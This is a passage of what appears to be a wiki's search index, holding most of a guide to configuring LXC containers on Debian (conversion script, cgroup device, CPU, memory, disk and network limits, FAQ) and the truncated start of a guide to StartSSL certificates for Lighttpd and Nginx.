lxc.cgroup.devices.deny = a # /dev/null and zero lxc.cgroup.devices.allow = c 1:3 rwm lxc.cgroup.devices.allow = c 1:5 rwm # /dev/consoles lxc.cgroup.devices.allow = c 5:1 rwm # /dev/tty lxc.cgroup.devices.allow = c 5:0 rwm lxc.cgroup.devices.allow = c 4:0 rwm lxc.cgroup.devices.allow = c 4:1 rwm # /dev/{,u}random lxc.cgroup.devices.allow = c 1:9 rwm # /dev/random lxc.cgroup.devices.allow = c 1:8 rwm # /dev/pts/* lxc.cgroup.devices.allow = c 136:* rwm # /dev/ptmx lxc.cgroup.devices.allow = c 5:2 rwm # /dev/rtc lxc.cgroup.devices.allow = c 254:0 rwm # /dev/fuse lxc.cgroup.devices.allow = c 10:229 rwm ## Limits #lxc.cgroup.cpu.shares = 1024 #lxc.cgroup.cpuset.cpus = 0 #lxc.cgroup.memory.limit_in_bytes = 256M #lxc.cgroup.memory.memsw.limit_in_bytes = 1G #lxc.cgroup.blkio.weight = 500 ## Filesystem lxc.mount.entry = proc $rootfs/proc proc nodev,noexec,nosuid 0 0 lxc.mount.entry = sysfs $rootfs/sys sysfs defaults,ro 0 0 lxc.rootfs = $rootfs # LVM #lxc.rootfs = /dev/vg/lvname EOF # Adding shared data directory if existing if [ -d /srv/share/$hostname ]; then echo \"lxc.mount.entry = /srv/share/$hostname $rootfs/srv/$hostname none defaults,bind 0 0\" \u003e\u003e $path/config else echo \"#lxc.mount.entry = /srv/share/$hostname $rootfs/srv/$hostname none defaults,bind 0 0\" \u003e\u003e $path/config fi gen_mac=`openssl rand -hex 6 | sed 's/\\(..\\)/\\1:/g; s/.$//'` cat \u003e\u003e $path/config \u003c\u003c EOF #lxc.mount.entry = /srv/$hostname $rootfs/srv/$hostname none defaults,bind 0 0 ## Network lxc.network.type = veth lxc.network.flags = up #lxc.network.hwaddr = $gen_mac lxc.network.link = lxcbr0 lxc.network.name = eth0 lxc.network.veth.pair = veth-$hostname EOF if [ $? -ne 0 ]; then echo \"Failed to add configuration\" return 1 fi return 0 } usage() { cat \u003c -n|--name=name EOF return 0 } options=$(getopt -o hp:n:c -l help,path:,name:,clean -- \"$@\") if [ $? -ne 0 ]; then usage $(basename $0) exit 1 fi eval set -- \"$options\" while true do case \"$1\" in -h|--help) usage $0 \u0026\u0026 exit 0;; -p|--path) path=$2; shift 2;; -n|--name) name=$2; shift 2;; --) shift 1; break ;; *) break ;; esac done if [ ! -z \"$clean\" -a -z \"$path\" ]; then clean || exit 1 exit 0 fi if [ -z \"$path\" ]; then echo \"'path' parameter is required\" exit 1 fi if [ \"$(id -u)\" != \"0\" ]; then echo \"This script should be run as 'root'\" exit 1 fi rootfs=$path/rootfs configure_debian $rootfs $name if [ $? -ne 0 ]; then echo \"failed to configure debian for a container\" exit 1 fi copy_configuration $path $rootfs if [ $? -ne 0 ]; then echo \"failed write configuration file\" exit 1 fi To use it, it’s easy. First of all mount or copy all your datas in the rootfs folder, be sure to have enough space, then launch the lxc-convert script like in this example :\nmigrated_container=migrated_container mkdir -p /var/lib/lxc/$migrated_container/rootfs rsync -e ssh -a --exclude '/dev' --exclude '/proc' --exclude '/sys' :/ /var/lib/lxc/$migrated_container/rootfs lxc-convert -p /var/lib/lxc/$migrated_container -n $migrated_container Adapt the remote host to your distant SSH host or rsync without SSH if it’s possible. During the transfer, you need to exclude some folders to avoid errors (/proc, /sys, /dev). They will be recreated during the lxc-convert.\nThen you’ll be able to start it :-)\nContainer configuration linkOnce you’ve initialized your container, there are a lot of interesting options. Here are some for a classical configuration (/var/lib/lxc/mycontainer/config):\n## Container # Container name lxc.utsname = mycontainer # Path where default container is based lxc.rootfs = /var/lib/lxc/mycontainer/rootfs # Set architecture type lxc.arch = x86_64 #lxc.console = /var/log/lxc/mycontainer.console # Number of tty/pts available for that container lxc.tty = 6 lxc.pts = 1024 ## Capabilities lxc.cap.drop = mac_admin lxc.cap.drop = mac_override lxc.cap.drop = sys_admin lxc.cap.drop = sys_module ## Devices # Allow all devices #lxc.cgroup.devices.allow = a # Deny all devices lxc.cgroup.devices.deny = a # Allow to mknod all devices (but not using them) lxc.cgroup.devices.allow = c *:* m lxc.cgroup.devices.allow = b *:* m # /dev/console lxc.cgroup.devices.allow = c 5:1 rwm # /dev/fuse lxc.cgroup.devices.allow = c 10:229 rwm # /dev/null lxc.cgroup.devices.allow = c 1:3 rwm # /dev/ptmx lxc.cgroup.devices.allow = c 5:2 rwm # /dev/pts/* lxc.cgroup.devices.allow = c 136:* rwm # /dev/random lxc.cgroup.devices.allow = c 1:8 rwm # /dev/rtc lxc.cgroup.devices.allow = c 254:0 rwm # /dev/tty lxc.cgroup.devices.allow = c 5:0 rwm # /dev/urandom lxc.cgroup.devices.allow = c 1:9 rwm # /dev/zero lxc.cgroup.devices.allow = c 1:5 rwm ## Limits #lxc.cgroup.cpu.shares = 1024 #lxc.cgroup.cpuset.cpus = 0 #lxc.cgroup.memory.limit_in_bytes = 256M #lxc.cgroup.memory.memsw.limit_in_bytes = 1G ## Filesystem # fstab for the containers with advanced features like bindind mount. # Mount bind between host and containers (mount --bind equivalent) lxc.mount.entry = proc /var/lib/lxc/mycontainer/rootfs/proc proc nodev,noexec,nosuid 0 0 lxc.mount.entry = sysfs /var/lib/lxc/mycontainer/rootfs/sys sysfs defaults,ro 0 0 #lxc.mount.entry = /srv/mycontainer /var/lib/lxc/mycontainer/rootfs/srv/mycontainer none defaults,bind 0 0 ## Network lxc.network.type = veth lxc.network.flags = up lxc.network.hwaddr = 11:22:33:44:55:66 lxc.network.link = br0 lxc.network.mtu = 1500 lxc.network.name = eth0 lxc.network.veth.pair = veth-$name For an LVM configuration:\nlxc.tty = 4 lxc.pts = 1024 lxc.utsname = mycontainer ## Capabilities lxc.cap.drop = sys_admin # When using LXC with apparmor, uncomment the next line to run unconfined: #lxc.aa_profile = unconfined lxc.cgroup.devices.deny = a # /dev/null and zero lxc.cgroup.devices.allow = c 1:3 rwm lxc.cgroup.devices.allow = c 1:5 rwm # consoles lxc.cgroup.devices.allow = c 5:1 rwm lxc.cgroup.devices.allow = c 5:0 rwm lxc.cgroup.devices.allow = c 4:0 rwm lxc.cgroup.devices.allow = c 4:1 rwm # /dev/{,u}random lxc.cgroup.devices.allow = c 1:9 rwm lxc.cgroup.devices.allow = c 1:8 rwm lxc.cgroup.devices.allow = c 136:* rwm lxc.cgroup.devices.allow = c 5:2 rwm # rtc lxc.cgroup.devices.allow = c 254:0 rwm # mounts point lxc.mount.entry = proc proc proc nodev,noexec,nosuid 0 0 lxc.mount.entry = sysfs sys sysfs defaults 0 0 lxc.rootfs = /dev/vg/mycontainer Architectures linkYou can set the container architecture on a container. For example, you can use an x86 container on a x64 kernel (/var/lib/lxc/mycontainer/config):\nlxc.arch=x86 Capabilities linkYou can specify the capability to be dropped in the container. A single line defining several capabilities with a space separation is allowed. The format is the lower case of the capability definition without the “CAP_” prefix, eg. CAP_SYS_MODULE should be specified as sys_module. You can see the complete list of linux capabilities with explanations by reading the man page :\nman 7 capabilities Devices linkYou can manage (allow/deny) accessible devices directly from your containers. By default, everything is disabled (/var/lib/lxc/mycontainer/config):\n## Devices # Allow all devices #lxc.cgroup.devices.allow = a # Deny all devices lxc.cgroup.devices.deny = a a : means all devices You can then allow some of them easily5 (/var/lib/lxc/mycontainer/config):\nlxc.cgroup.devices.allow = c 5:1 rwm # dev/console lxc.cgroup.devices.allow = c 5:0 rwm # dev/tty lxc.cgroup.devices.allow = c 4:0 rwm # dev/tty0 To get the complete list of allowed devices (lxc-cgroup):\nlxc-cgroup -n mycontainer devices.list To get a better understanding of this, here are explanations6:\nlxc.cgroup.devices.allow = : : b (block), c (char), etc … : major number : minor number (wildcard is accepted) : r (read), w (write), m (mapping) Container limits (cgroups) linkIf you’ve never played with Cgroups, look at my documentation. With LXC, here are the available ways to setup cgroups to your containers :\nYou can change cgroups values with lxc-cgroup command (on the fly): lxc-cgroup -n You can directly play with /proc (on the fly): echo \u003e /sys/fs/cgroup/lxc// And set it directly in the config file (persistent way) (/var/lib/lxc/mycontainer/config): lxc.cgroup. = Cgroups can be changed on the fly.\nreport You should warn when you reduce some of them, especially the memory (be sure that you do not reduce more than used). If you want to see available cgroups for a container :\n\u003e ls -1 /sys/fs/cgroup/lxc/ blkio.io_merged blkio.io_queued blkio.io_service_bytes blkio.io_serviced blkio.io_service_time blkio.io_wait_time blkio.reset_stats blkio.sectors blkio.time blkio.weight blkio.weight_device cgroup.clone_children cgroup.event_control cgroup.procs cpuacct.stat cpuacct.usage cpuacct.usage_percpu cpuset.cpu_exclusive cpuset.cpus cpuset.mem_exclusive cpuset.mem_hardwall cpuset.memory_migrate cpuset.memory_pressure cpuset.memory_spread_page cpuset.memory_spread_slab cpuset.mems cpuset.sched_load_balance cpuset.sched_relax_domain_level cpu.shares devices.allow devices.deny devices.list freezer.state memory.failcnt memory.force_empty memory.limit_in_bytes memory.max_usage_in_bytes memory.memsw.failcnt memory.memsw.limit_in_bytes memory.memsw.max_usage_in_bytes memory.memsw.usage_in_bytes memory.move_charge_at_immigrate memory.numa_stat memory.oom_control memory.soft_limit_in_bytes memory.stat memory.swappiness memory.usage_in_bytes memory.use_hierarchy net_cls.classid notify_on_release tasks CPU linkCPU Pining linkIf you want to bind some CPU/Cores to a VM/Container, there is a solution called CPU Pining :). First, look at the available cores on your server :\n\u003e grep -e processor -e core /proc/cpuinfo | sed 's/processor/\\nprocessor/' processor\t: 0 core id\t: 0 cpu cores\t: 4 processor\t: 1 core id\t: 1 cpu cores\t: 4 processor\t: 2 core id\t: 2 cpu cores\t: 4 processor\t: 3 core id\t: 3 cpu cores\t: 4 processor\t: 4 core id\t: 0 cpu cores\t: 4 processor\t: 5 core id\t: 1 cpu cores\t: 4 processor\t: 6 core id\t: 2 cpu cores\t: 4 processor\t: 7 core id\t: 3 cpu cores\t: 4 You can see there are 7 cores (called processor). In fact there are 4 cores with 2 thread each on this CPU. That’s why there are 4 cores id and 8 detected cores.\nSo here is the list of the cores with their attached core:\ncore id 0 : processors 0 and 4 core id 1 : processors 1 and 5 core id 2 : processors 2 and 6 core id 3 : processors 3 and 7 Now if I want to dedicate a set of cores to a container (/var/lib/lxc/mycontainer/config):\nlxc.cgroup.cpuset.cpus = 0-3 This will add the 4 firsts cores to the container. Then if I only want CPU 1 and 3 (/var/lib/lxc/mycontainer/config):\nlxc.cgroup.cpuset.cpus = 1,3 Check CPU assignments linkYou can check how many CPU Pining are working for a container. On the host file, launch “htop” for example and in the container launch stress :\naptitude install stress stress --cpu 2 --timeout 10s This will stress 2 CPU at 100% for 10 seconds. You’ll see your htop CPU bars at 100%. If I change 2 by 3 and only binded 2 CPUs, only 2 will be at 100% :-)\nScheduler linkThis is the other method to assign CPU to a container. You need to add weight to VMs so that the scheduler can decide which container should use CPU time form the CPU clock. For instance, if a container is set to 512 and another to 1024, the last one will have twice more CPU time than the first container. To edit this property (/var/lib/lxc/mycontainer/config):\nlxc.cgroup.cpu.shares = 512 If you need more documentation, look at the kernel page7.\nMemory linkYou can limit the memory in a container like this (/var/lib/lxc/mycontainer/config):\nlxc.cgroup.memory.limit_in_bytes = 128M If you’ve got error when trying to limit memory, check the FAQ.\nlxc.cgroup.memory.limit_in_bytes = 128M Check memory from the host linkYou can check memory from the host like that8 :\nCurrent memory usage: cat /sys/fs/cgroup/lxc/mycontainer/memory.usage_in_bytes Current memory + swap usage: cat /sys/fs/cgroup/lxc/mycontainer/memory.memsw.usage_in_bytes Maximum memory usage: cat /sys/fs/cgroup/lxc/mycontainer/memory.max_usage_in_bytes Maximum memory + swap usage : cat /sys/fs/cgroup/lxc/mycontainer/memory.memsw.max_usage_in_bytes Here is an easier solution to read informations :\nawk '{ printf \"%sK\\n\", $1/ 1024 }' /sys/fs/cgroup/lxc/mycontainer/memory.usage_in_bytes awk '{ printf \"%sM\\n\", $1/ 1024 / 1024 }' /sys/fs/cgroup/lxc/mycontainer/memory.usage_in_bytes Check memory in the container linkThe actual problem is you can’t check how many memory you’ve set and is available for your container. For the moment /proc/meminfo is not correctly updated9. If you need to validate the available memory on a container, you have to write fake data into the allocated memory area to trigger the memory checks of the kernel/visualization tool.\nMemory overcommit is a Linux kernel feature that lets applications allocate more memory than is actually available. The idea behind this feature is that some applications allocate large amounts of memory just in case, but never actually use it. Thus, memory overcommit allows you to run more applications than actually fit in your memory, provided the applications don’t actually use the memory they have allocated. If they do, then the kernel (via OOM killer) terminates the application.\nHere is the code10 (memory_allocation.c):\n#include #include #include #include main() { int i; for(i=0;i\u003c9000;i++) { int *ptr = malloc(i*1024*1024); if (ptr == NULL) { printf (\"Soft memory allocation failed for %i MB\\n\",i ); break; } else { free(ptr); ptr = NULL; } } for(i=0;i\u003c9000;i++) { int *ptr = malloc(i*1024*1024); if (ptr == NULL) { printf (\"Memory allocation failed for %i MB\\n\",i ); break; } else { memset(ptr, 0, i*1024*1024); printf(\"Wrote %i MB to memory\\n\", i); //usleep(1000); free(ptr); ptr = NULL; } } } Then compil it (with gcc) :\naptitude install gcc gcc memory_allocation.c -o memory_allocation You can now run the test :\n\u003e ./memory_allocation Soft memory allocation failed for 654 MB Wrote 0 MB to memory Wrote 1 MB to memory Wrote 2 MB to memory Wrote 3 MB to memory [...] Wrote 185 MB to memory Wrote 186 MB to memory Wrote 187 MB to memory Wrote 188 MB to memory Killed SWAP linkYou can limit the swap in a container like this (/var/lib/lxc/mycontainer/config):\nlxc.cgroup.memory.memsw.limit_in_bytes = 192M report This limit is not only SWAP but Memory + SWAP That mean that “lxc.cgroup.memory.memsw.limit_in_bytes” should be at least equal to “lxc.cgroup.memory.limit_in_bytes”.\nIf you’ve got error when trying to limit swap, check the FAQ.\nDisks linkBy default, LXC doesn’t provide any disks limitation. Anyway, there are enough solution today to make that kind of limitations:\nLVM: create one LV per container BTRFS: using integrated BTRFS quotas ZFS: if you’re using ZFS on Linux, you can use integrated zfs/zpool quotas Quotas: using classical Linux quotas (not the recommended solution) Disk image: you can use QCOW/QCOW2/RAW/QED images Mount link warning You should take care if you want to create a mount entry in a subdirectory of /mnt. It won’t work so easily. The reason this happens is that by default ‘mnt’ is the directory used as pivotdir, where the old_root is placed during pivot_root(). After that, everything under pivotdir is unmounted.\nA workaround is to specify an alternate ’lxc.pivotdir’ in the container configuration file.11\nBlock Device linkYou can mount block devices in adding in your container configuration lines like this (adapt with your needs) (/var/lib/lxc/mycontainer/config):\nlxc.mount.entry = /dev/sdb1 /var/lib/lxc/mycontainer/rootfs/mnt ext4 rw 0 2 Bind mount linkYou also can mount bind mountpoints like that (adapt with your needs) (/var/lib/lxc/mycontainer/config):\nlxc.mount.entry = /path/in/host/mount_point /var/lib/lxc/mycontainer/rootfs/mount_moint none bind 0 0 Disk priority linkYou can set disk priority like that (default is 500) (/var/lib/lxc/mycontainer/config):\nlxc.cgroup.blkio.weight = 500 Higher the value is, more the priority will be important. You can get more informations here. Maximum value is 1000 and lowest is 10.\ninfo You need to have CFQ scheduler to make it work properly Disk bandwidth linkAnother solution is to limit bandwidth usage, but the Wheezy kernel doesn’t have the “CONFIG_BLK_DEV_THROTTLING” activated. You need to take a testing/unstable kernel instead or recompile a new one with this option activated. To do this follow the kernel procedure.\nThen, you’ll be able to limit bandwidth like that (/var/lib/lxc/mycontainer/config):\n# Limit to 1Mb/s lxc.cgroup.blkio.throttle.read_bps_device = 100 Network linkYou can limit network bandwidth using native kernel QOS directly on cgroups. For example, we have 2 containers : A and B. To get a good understanding, look at this schema:\n12\nNow you’ve understand how it could looks like. Now if I want to limit a container to 30Mb and the other one to 40Mb, here is how I should achieve it. Assign IDs on containers that should have quality of service :\necho 0x1001 \u003e /sys/fs/cgroup/lxc//net_cls.classid echo 0x1002 \u003e /sys/fs/cgroup/lxc//net_cls.classid 0x1001 : corresponding to 10:1 0x1002 : corresponding to 10:2 Then select the desired QOS algorithm (HTB) :\ntc qdisc add dev eth0 root handle 10: htb Choose the desired bandwidth on containers IDs :\ntc class add dev eth0 parent 10: classid 10:1 htb rate 40mbit tc class add dev eth0 parent 10: classid 10:2 htb rate 30mbit Enable filtering :\ntc filter add dev eth0 parent 10: protocol ip prio 10 handle 1: cgroup Resources statistics linkUnfortunately, you can’t have informations directly on the containers, however you can have informations from the host. Here is a little script to do it (/usr/bin/lxc-resources-stats):\n#!/bin/bash cd /sys/fs/cgroup/lxc/ for i in * ; do if [ -d $i ] ; then echo \"===== $i =====\" echo \"CPU, cap: \" $(cat /sys/fs/cgroup/lxc/$i/cpuset.cpus) echo \"CPU, shares: \" $(cat /sys/fs/cgroup/lxc/$i/cpu.shares) awk '{ printf \"RAM, limit usage: %sM\\n\", $1/ 1024/1024 }' /sys/fs/cgroup/lxc/$i/memory.limit_in_bytes awk '{ printf \"RAM+SWAP, limit usage: %sM\\n\", $1/ 1024/1024 }' /sys/fs/cgroup/lxc/$i/memory.memsw.limit_in_bytes awk '{ printf \"RAM, current usage: %sM\\n\", $1/ 1024/1024 }' /sys/fs/cgroup/lxc/$i/memory.usage_in_bytes awk '{ printf \"RAM+SWAP, current usage: %sM\\n\", $1/ 1024/1024 }' /sys/fs/cgroup/lxc/$i/memory.memsw.usage_in_bytes awk '{ printf \"RAM, max usage: %sM\\n\", $1/ 1024/1024 }' /sys/fs/cgroup/lxc/$i/memory.max_usage_in_bytes awk '{ printf \"RAM+SWAP, max usage: %sM\\n\", $1/ 1024/1024 }' /sys/fs/cgroup/lxc/$i/memory.memsw.max_usage_in_bytes echo \"DISK I/O weight: \" $(cat /sys/fs/cgroup/lxc/$i/blkio.weight) echo \"\" fi done Here is the result:\n\u003e lxc-resources-stats ===== mycontainer ===== CPU, cap: 3-4,6-7 CPU, shares: 1024 RAM, limit usage: 2048M RAM+SWAP, limit usage: 3072M RAM, current usage: 1577.33M RAM+SWAP, current usage: 1582.79M RAM, max usage: 2048M RAM+SWAP, max usage: 2060.5M DISK I/O weight: 500 FAQ linkHow could I know if I’m in a container or not? linkThere’s an easy way to know that :\n\u003e cat /proc/$$/cgroup 1:perf_event,blkio,net_cls,freezer,devices,memory,cpuacct,cpu,cpuset:/lxc/mycontainer You can see in the cpuset, the container name where I am (“mycontainer” here).\nCan’t connect to console linkIf you want to plug yourself to a container through the console, your first need to create devices :\nchroot /var/lib/lxc/mycontainer/rootfs mknod -m 666 /dev/tty1 c 4 1 mknod -m 666 /dev/tty2 c 4 2 mknod -m 666 /dev/tty3 c 4 3 mknod -m 666 /dev/tty4 c 4 4 mknod -m 666 /dev/tty5 c 4 5 mknod -m 666 /dev/tty6 c 4 6 Then you’ll be able to connect:\nlxc-console -n mycontainer Can’t create a LXC LVM container linkIf you get this kind of error during LVM :\nCopying local cache to /var/lib/lxc/mycontainerlvm/rootfs.../usr/share/lxc/templates/lxc-debian: line 101: /var/lib/lxc/mycontainerlvm/rootfs/etc/apt/sources.list.d/debian.list: No such file or directory /usr/share/lxc/templates/lxc-debian: line 107: /var/lib/lxc/mycontainerlvm/rootfs/etc/apt/sources.list.d/debian.list: No such file or directory /usr/share/lxc/templates/lxc-debian: line 111: /var/lib/lxc/mycontainerlvm/rootfs/etc/apt/sources.list.d/debian.list: No such file or directory /usr/share/lxc/templates/lxc-debian: line 115: /var/lib/lxc/mycontainerlvm/rootfs/etc/apt/sources.list.d/debian.list: No such file or directory /usr/share/lxc/templates/lxc-debian: line 183: /var/lib/lxc/mycontainerlvm/rootfs/etc/fstab: No such file or directory mount: mount point /var/lib/lxc/mycontainerlvm/rootfs/dev/pts does not exist mount: mount point /var/lib/lxc/mycontainerlvm/rootfs/proc does not exist mount: mount point /var/lib/lxc/mycontainerlvm/rootfs/sys does not exist mount: mount point /var/lib/lxc/mycontainerlvm/rootfs/var/cache/apt/archives does not exist /usr/share/lxc/templates/lxc-debian: line 49: /var/lib/lxc/mycontainerlvm/rootfs/etc/dpkg/dpkg.cfg.d/lxc-debconf: No such file or directory /usr/share/lxc/templates/lxc-debian: line 55: /var/lib/lxc/mycontainerlvm/rootfs/usr/sbin/policy-rc.d: No such file or directory chmod: cannot access `/var/lib/lxc/mycontainerlvm/rootfs/usr/sbin/policy-rc.d': No such file or directory chroot: failed to run command `/usr/bin/env': No such file or directory chroot: failed to run command `/usr/bin/env': No such file or directory chroot: failed to run command `/usr/bin/env': No such file or directory umount: /var/lib/lxc/mycontainerlvm/rootfs/var/cache/apt/archives: not found chroot: failed to run command `/usr/bin/env': No such file or directory chroot: failed to run command `/usr/bin/env': No such file or directory chroot: failed to run command `/usr/bin/env': No such file or directory chroot: failed to run command `/usr/bin/env': No such file or directory chroot: failed to run command `/usr/bin/env': No such file or directory chroot: failed to run command `/usr/bin/env': No such file or directory umount: /var/lib/lxc/mycontainerlvm/rootfs/dev/pts: not found umount: /var/lib/lxc/mycontainerlvm/rootfs/proc: not found umount: /var/lib/lxc/mycontainerlvm/rootfs/sys: not found 'debian' template installed Unmounting LVM 'mycontainerlvm' created this is because of a Debian bug that the maintainer doesn’t want to fix :-(. Here is a workaround.\nCan’t limit container memory or swap linkIf you can’t limit container memory and have this kind of issue:\n\u003e lxc-cgroup -n mycontainer memory.limit_in_bytes \"128M\" lxc-cgroup: cgroup is not mounted lxc-cgroup: failed to assign '128M' value to 'memory.limit_in_bytes' for 'mycontainer' This is because cgroup memory capability is not loaded from your kernel. You can check it like that :\n\u003e cat /proc/cgroups #subsys_name\thierarchy\tnum_cgroups\tenabled cpuset\t1\t4\t1 cpu\t1\t4\t1 cpuacct\t1\t4\t1 memory\t0\t1\t0 devices\t1\t4\t1 freezer\t1\t4\t1 net_cls\t1\t4\t1 blkio\t1\t4\t1 perf_event\t1\t4\t1 As we want to manage memory and swap on containers, as it’s not available by default, add cgroup argument to grub to activate those functionality:\ncgroup RAM feature : cgroup_enable=memory cgroup SWAP feature : swapaccount=1 With grub (/etc/default/grub):\n# If you change this file, run 'update-grub' afterwards to update # /boot/grub/grub.cfg. # For full documentation of the options in this file, see: # info -f grub -n 'Simple configuration' GRUB_DEFAULT=0 GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=`lsb_release -i -s 2\u003e /dev/null || echo Debian` GRUB_CMDLINE_LINUX_DEFAULT=\"quiet cgroup_enable=memory swapaccount=1\" GRUB_CMDLINE_LINUX=\"\" [...] Then regenerate grub config:\nupdate-grub Now reboot to make changes available.\nAfter reboot you can check that memory is activated:\n\u003e cat /proc/cgroups #subsys_name\thierarchy\tnum_cgroups\tenabled cpuset\t1\t6\t1 cpu\t1\t6\t1 cpuacct\t1\t6\t1 memory\t1\t6\t1 devices\t1\t6\t1 freezer\t1\t6\t1 net_cls\t1\t6\t1 blkio\t1\t6\t1 perf_event\t1\t6\t1 Another way to check is the mount command:\n\u003e mount | grep cgroup cgroup on /sys/fs/cgroup type cgroup (rw,relatime,perf_event,blkio,net_cls,freezer,devices,memory,cpuacct,cpu,cpuset,clone_children) You can see that memory is available here13.\nI can’t start my container, how could I debug? linkYou can debug a container on boot by this way:\nlxc-start -n mycontainer -l debug -o debug.out Now you can look at debug.out and see what’s wrong.\n/usr/sbin/grub-probe: error: cannot find a device for / (is /dev mounted?) linkI got dpkg error issue while I wanted to upgrade an LXC containers running on Debian because grub couldn’t find /.\nTo resolve that issue, I needed to remove definitively grub and grub-pc. Then the system accepted to remove the kernel.\ntelinit: /run/initctl: No such file or directory linkIf you got his kind of error when you want to properly shutdown your LXC container, you need to create a device in your container:\nmknod -m 600 /var/lib/lxc//rootfs/run/initctl p And then add this in the container configuration file (/var/lib/lxc//config):\nlxc.cap.drop = sys_admin You can now shutdown it properly without any issue :-)\nSome containers are loosing their IP addresse at boot linkIf you’re experiencing issues with booting containers which are loosing their static IP at boot14 there is a solution. The first thing to do to recover is:\nifdown eth0 \u0026\u0026 ifup eth0 But is is a temporary solution. You in fact need to add in your LXC configuration file, the IP address with CIDR of your container (/var/lib/lxc//config):\nlxc.network.ipv4 = 192.168.0.50/24 lxc.network.ipv4.gateway = auto The automatic gateway setting is will in fact address to the container, the IP of the interface on which the container is attached. Then you have to modify your container network configuration and change static configuration to manual of eth0 interface. You should have something like this:\nallow-hotplug eth0 iface eth0 inet manual You’re now ok, on next reboot the IP will be properly configured automatically by LXC and it will work anytime.\nOpenVPN linkTo make openvpn working, you need to allow tun devices. In the LXC configuration, simply add this (container.conf):\nlxc.cgroup.devices.allow = c 10:200 rwm And in the container, create it:\nmkdir /dev/net mknod /dev/net/tun c 10 200 chmod 0666 /dev/net/tun LXC inception or Docker in LXC linkTo get Docker in LXC or LXC in LXC working, you need to have some packages installed inside the LXC container:\napt-get install cgroup-bin libcgroup1 cgroupfs-mount In the container configuration, you also need to have that line (config):\nlxc.mount.auto = cgroup Then it’s ok :-)\nLXC control device mapper linkIn Docker, you may want to use devicemapper driver. To get it working, you need to let your LXC container to control devicemappers. To do so, just add those 1 lines in your container configuration:\nlxc.cgroup.devices.allow = c 10:236 rwm lxc.cgroup.devices.allow = b 252:* rwm References link http://www.pointroot.org/index.php/2013/05/12/installation-du-systeme-de-virtualisation-lxc-linux-containers-sur-debian-wheezy/ http://box.matto.nl/lxconlaptop.html https://help.ubuntu.com/lts/serverguide/lxc.html http://debian-handbook.info/browse/stable/sect.virtualization.html http://www.fitzdsl.net/2012/12/installation-dun-conteneur-lxc-sur-dedibox/ http://freedomboxblog.nl/installing-lxc-dhcp-and-dns-on-my-freedombox/ http://containerops.org/2013/11/19/lxc-networking/ http://lxc.sourceforge.net/ ↩︎\nhttp://pi.lastr.us/doku.php/virtualizacion:lxc:digitalocean-wheezy ↩︎\nhttp://philpep.org/blog/lxc-sur-debian-squeeze ↩︎\nhttps://help.ubuntu.com/lts/serverguide/lxc.html ↩︎\nhttp://lwn.net/Articles/273208/ ↩︎\nhttp://wiki.rot13.org/rot13/index.cgi?action=display_html;page_name=lxc ↩︎\nhttps://www.kernel.org/doc/Documentation/scheduler/sched-design-CFS.txt ↩︎\nhttp://www.mattfischer.com/blog/?p=399 ↩︎\nhttp://webcache.googleusercontent.com/search?q=cache:vWmLMNBRKIYJ:comments.gmane.org/gmane.linux.kernel.containers/23094+\u0026cd=6\u0026hl=fr\u0026ct=clnk\u0026gl=fr\u0026client=firefox-a ↩︎\nhttp://www.jotschi.de/Uncategorized/2010/11/11/memory-allocation-test.html ↩︎\nhttps://bugs.launchpad.net/ubuntu/+source/lxc/+bug/986385 ↩︎\nhttp://vger.kernel.org/netconf2009_slides/Network%20Control%20Group%20Whitepaper.odt ↩︎\nhttp://vin0x64.fr/2012/01/debian-limite-de-memoire-sur-conteneur-lxc/ ↩︎\nhttp://serverfault.com/questions/571714/setting-up-bridged-lxc-containers-with-static-ips/586577#586577 ↩︎\n"
            }
        );
    index.add(
            {
                id:  161 ,
                href: "\/G%C3%A9rer_des_certificats_SSL_sign%C3%A9s_par_une_autorit%C3%A9_de_certification\/",
                title: "Managing SSL Certificates Signed by a Certificate Authority",
                description: "Guide for generating and configuring SSL certificates signed by a certificate authority like StartSSL for Nginx and Lighttpd web servers.",
                content: " Operating System Debian 7 Website StartSSL Website Last Update 17/02/2015 Others Nginx 1.2.1\nLighttpd 1.4.31 Introduction linkYou may need SSL certificates for your company or for personal needs on your website. The drawback of self-generated and self-signed certificates is that the first time you visit your site, you’ll get a warning message.\nTo avoid this warning and to have a nice little padlock on your browser indicating that you’re protected, you typically need to pay a certification authority a lot of money to get a valid SSL certificate.\nHowever, there are kind companies that offer free or inexpensive certificates for your domain name that are properly signed :-). We’ll look at how to do this with StartCom.\nCertificate Generation linkBefore you start, create your account and go to the private key step on StartCom.\nHere, I’ll present several servers:\nLighttpd: Generating a class 1 key1 Nginx: Generating a wildcard key in class 22 Feel free to adapt to your configuration if you need to switch these.\nLighttpd linkWe’ll see here how to set up certificates with Lighttpd. First, let’s create the essentials:\ncd /etc/lighttpd mkdir ssl cd ssl Next, we’ll generate the RSA private key and secure it:\nopenssl genrsa -out server.key 4096 chmod 400 server.key Copy the content of this key to the website so it can generate the rest. Then we’ll create the CSR:\nopenssl req -new -nodes -key server.key -out server.csr For the common name part, enter your default site (ex: www.deimos.fr).\nThen download the StartCom certificates:\nwget http://www.startssl.com/certs/ca.pem wget http://www.startssl.com/certs/sub.class1.server.ca.crt wget http://www.startssl.com/certs/sub.class1.server.ca.pem Nginx linkWe’ll see here how to set up certificates with Nginx. First, let’s create the essentials:\ncd /etc/nginx mkdir ssl cd ssl Next, we’ll generate the RSA private key and secure it:\nopenssl genrsa -out server.key 4096 chmod 400 server.key Copy the content of this key to the website so it can generate the rest. Then we’ll create the CSR:\nopenssl req -new -nodes -key server.key -out server.csr For the common name part, enter your default site (ex: www.deimos.fr).\nThen download the StartCom certificates:\nwget http://www.startssl.com/certs/ca.pem wget http://www.startssl.com/certs/sub.class2.server.ca.crt wget http://www.startssl.com/certs/sub.class2.server.ca.pem Certificate Signing linkNow we’ll generate a certificate on the StartSSL website. To begin, create your domain with the Validation Wizard:\nChoose Domain Name Validation:\nThen create the domain you want:\nFinish creating the domain and click on Certificates Wizard:\nThen select “Web Server SSL/TLS Certificate” as that’s what we need:\nSkip this part since we’ve generated our own certificate:\nAnd paste the contents of the server.csr file into the text area:\nComplete the process, then create a server.crt file with the SSL certificate content that will be provided.\nConfiguration linkLighttpd linkNext, we’ll create a PEM certificate from those we’ve generated along with a CRT file:\ncat server.key server.crt \u003e server.pem cat ca.pem sub.class1.server.ca.pem \u003e ca-certs.crt Then we’ll configure our Lighttpd server to use our new keys (/etc/lighttpd/conf-enabled/10-ssl.conf):\n## lighttpd support for SSLv2 and SSLv3 ## ## Documentation: /usr/share/doc/lighttpd-doc/ssl.txt ## http://www.lighttpd.net/documentation/ssl.html #### SSL engine $SERVER[\"socket\"] == \"0.0.0.0:443\" { 